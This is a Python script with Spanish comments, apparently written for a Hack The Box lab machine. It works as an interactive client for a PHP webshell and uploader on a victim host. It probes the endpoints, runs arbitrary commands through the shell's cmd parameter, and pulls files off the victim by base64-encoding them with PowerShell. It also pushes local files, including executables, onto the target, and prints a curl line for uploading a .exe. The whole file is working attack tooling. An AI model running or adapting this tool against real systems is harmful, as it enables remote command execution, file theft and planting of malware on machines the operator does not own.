import requests
import urllib.parse
import sys
import os
import argparse

# Códigos de color ANSI para la terminal
VERDE = "\033[92m"
AZUL = "\033[94m"
ROJO = "\033[91m"
AMARILLO = "\033[93m"
RESET = "\033[0m"

# CONFIGURACIÓN: Lista única con todas tus rutas combinadas
ENDPOINTS = [
    "http://192.168.20.20:8081/path/uploader.php",
    "http://192.168.20.20:8081/path/shell.php"
]

# Límite de seguridad para evitar consumo excesivo de memoria (10 MB)
MAX_BYTES = 10 * 1024 * 1024 

# Variable global que almacenará la URL activa seleccionada
URL_SHELL = None

def escanear_y_clasificar():
    """Recorre las rutas, las diferencia por comportamiento lógico y devuelve la primera webshell funcional."""
    print("[*] Iniciando análisis dinámico de comportamiento PHP...\n")
    webshells_encontradas = []
    uploaders_encontrados = []

    for url in ENDPOINTS:
        try:
            # PRUEBA 1: Verificar firma de la Webshell (¿Ejecuta comandos GET usando 'cmd'?)
            token_prueba = "VERIFY_SHELL_OK"
            cmd_codificado = urllib.parse.quote(f"echo {token_prueba}")
            respuesta_get = requests.get(f"{url}?cmd={cmd_codificado}", timeout=2)

            if respuesta_get.status_code == 200 and token_prueba in respuesta_get.text:
                print(f"{VERDE}[+] Webshell Confirmada:{RESET} {url}")
                webshells_encontradas.append(url)
                continue

            # PRUEBA 2: Verificar firma del Uploader (¿Procesa archivos por POST y devuelve 'OK'?)
            archivo_simulado = {'file': ('check.txt', 'ping')}
            respuesta_post = requests.post(url, files=archivo_simulado, timeout=2)

            if respuesta_post.status_code == 200 and "OK" in respuesta_post.text:
                print(f"{AZUL}[+] Uploader Confirmado:{RESET} {url}")
                uploaders_encontrados.append(url)
            else:
                if respuesta_get.status_code == 200:
                    print(f"{AMARILLO}[!] Archivo activo pero sin comportamiento reconocido:{RESET} {url}")
                else:
                    print(f"{ROJO}[-] Inaccesible (HTTP {respuesta_get.status_code}):{RESET} {url}")

        except requests.exceptions.RequestException:
            print(f"{ROJO}[-] Error de red / Timeout:{RESET} {url}")

    print("\n" + "="*60)
    print("               RESUMEN DE DISPONIBILIDAD")
    print("="*60)
    print(f" Webshells operativas (GET/system):  {VERDE}{len(webshells_encontradas)}{RESET}")
    print(f" Uploaders operativos (POST/move):   {AZUL}{len(uploaders_encontrados)}{RESET}")
    print(f" Inactivos o caídos:                 {ROJO}{len(ENDPOINTS) - len(webshells_encontradas) - len(uploaders_encontrados)}{RESET}")
    print("="*60 + "\n")

    if webshells_encontradas:
        return webshells_encontradas[0]
    return None

def ejecutar_comando(comando):
    """Envía el comando codificado, procesa la respuesta en streaming y maneja bytes de forma segura."""
    if not URL_SHELL:
        print(f"{ROJO}[!] Error: No hay ninguna webshell activa asignada.{RESET}")
        return None
        
    try:
        comando_codificado = urllib.parse.quote(comando)
        respuesta = requests.get(f"{URL_SHELL}?cmd={comando_codificado}", timeout=30, stream=True)
        
        if respuesta.status_code == 200:
            contenido_bytes = bytearray()
            for bloque in respuesta.iter_content(chunk_size=4096):
                contenido_bytes.extend(bloque)
                if len(contenido_bytes) > MAX_BYTES:
                    print(f"\n[!] Advertencia: Salida truncada porque excedió el límite de {MAX_BYTES / (1024*1024)} MB.")
                    break
            return contenido_bytes.decode('utf-8', errors='replace').strip()
        else:
            print(f"\n[!] Error HTTP: {respuesta.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Error de conexión: {e}")
        return None


def bajar_archivo(ruta_remota, ruta_local):
    """Descarga un archivo desde la máquina víctima leyendo su contenido en Base64."""
    print(f"[*] Descargando '{ruta_remota}' -> '{ruta_local}'...")
    # Corregido: Uso alternado de comillas dobles externas para no romper la cadena con las comillas simples de PowerShell
    comando = f'powershell -Command "[Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\'{ruta_remota}\'))"'
    
    salida_b64 = ejecutar_comando(comando)
    if salida_b64 and "Error" not in salida_b64 and "no se puede encontrar" not in salida_b64:
        try:
            import base64
            datos_binarios = base64.b64decode(salida_b64.replace("\r", "").replace("\n", ""))
            with open(ruta_local, "wb") as f:
                f.write(datos_binarios)
            print("[+] Descarga completada con éxito.")
        except Exception as e:
            print(f"[!] Error al procesar los datos de descarga: {e}")
    else:
        print("[!] Error: No se pudo descargar el archivo. Verifica la ruta remota.")


def subir_archivo(ruta_local, ruta_remota):
    """Sube un archivo local a la máquina víctima codificándolo en Base64."""
    if not os.path.exists(ruta_local):
        print(f"[!] Error: El archivo local '{ruta_local}' no existe.")
        return
        
    print(f"[*] Subiendo '{ruta_local}' -> '{ruta_remota}'...")
    try:
        import base64
        with open(ruta_local, "rb") as f:
            contenido_b64 = base64.b64encode(f.read()).decode('utf-8')
            
        # Corregido: Ajustadas comillas internas de PowerShell para evitar SyntaxError en la cadena
        comando = f'powershell -Command "[System.IO.File]::WriteAllBytes(\'{ruta_remota}\', [Convert]::FromBase64String(\'{contenido_b64}\'))"'
        ejecutar_comando(comando)
        print("[+] Archivo subido con éxito.")
    except Exception as e:
        print(f"[!] Error al subir el archivo: {e}")


def main():
    global URL_SHELL
    print("\n" + "="*60)
    print("      WEBSHELL INTERACTIVA AVANZADA - MÁQUINA HTB")
    print("="*60)
    
    # Fase inicial de escaneo y clasificación automatizada
    resultados_escaneo = escanear_y_clasificar()
    
    # Asignamos el primer elemento si es que devolvió una lista de webshells válidas
    if resultados_escaneo and isinstance(resultados_escaneo, list):
        URL_SHELL = resultados_escaneo[0]
    else:
        URL_SHELL = resultados_escaneo

    if not URL_SHELL:
        print(f"{ROJO}[!] Error crítico: No se encontró ninguna Webshell interactiva funcional en la lista.{RESET}")
        sys.exit(1)

    print("[*] Entorno inicializado con éxito.")
    print(f"[*] Canal interactivo establecido en: {VERDE}{URL_SHELL}{RESET}")
    print("[*] Obteniendo contexto del sistema operativo...")

    usuario = ejecutar_comando("whoami")
    if not usuario:
        usuario = "user"
        
    ruta_actual = ejecutar_comando("cd")
    if not ruta_actual or "Error" in ruta_actual:
        ruta_actual = "C:\\"

    print(f"[+] Conectado con éxito como: {usuario}")
    print("[*] Comandos especiales locales:")
    print("    -> upload <archivo_local> <nombre_remoto>")
    print("    -> download <archivo_remoto> <nombre_local>")
    print("    -> exit / clear")
    print("    >> Uso de los uploaders")
    print('''
    -> curl -F "file=@/ruta/de/tu/archivo/local.exe" http://192.168.20.20:8081/path/uploader.php
    
''')

    while True:
        try:
            prompt = f"({usuario}) {ruta_actual}> "
            comando = input(prompt).strip()
            
            if comando.lower() == 'exit':
                print("[*] Cerrando sesión...")
                break
            if not comando:
                continue
            if comando.lower() in ['clear', 'cls']:
                print("\033[H\033[2J", end="")
                continue

            # --- COMANDO ESPECIAL: UPLOAD ---
            if comando.startswith("upload "):
                partes = comando.split(" ")
                if len(partes) >= 3:
                    subir_archivo(partes[1], partes[2])
                else:
                    print("[!] Uso: upload <archivo_local> <ruta_remota>")
                continue

            # --- COMANDO ESPECIAL: DOWNLOAD ---
            if comando.startswith("download "):
                partes = comando.split(" ")
                if len(partes) >= 3:
                    bajar_archivo(partes[1], partes[2])
                else:
                    print("[!] Uso: download <ruta_remota> <archivo_local>")
                continue

            # Navegación estándar de directorios (cd)
            if comando.startswith("cd "):
                partes = comando.split(" ", 1)
                if len(partes) >= 2:
                    nueva_ruta = partes[1].strip()
                    comando_completo = f"cd /d \"{ruta_actual}\" && cd /d \"{nueva_ruta}\" && cd"
                    resultado = ejecutar_comando(comando_completo)
                    
                    if resultado and "El sistema no puede encontrar la ruta" not in resultado:
                        ruta_actual = resultado
                    else:
                        print(f"\n[!] Error: No se puede encontrar la ruta especificada: '{nueva_ruta}'\n")
                else:
                    print(f"\n{ruta_actual}\n")
                continue
                
            # Ejecución de comandos generales
            else:
                comando_completo = f"cd /d \"{ruta_actual}\" && {comando}"
                salida = ejecutar_comando(comando_completo)
                if salida:
                    print(f"\n{salida}\n")
                    
        except KeyboardInterrupt:
            print("\n\n[*] Saliendo de forma segura...")
            break


if __name__ == "__main__":
    main()
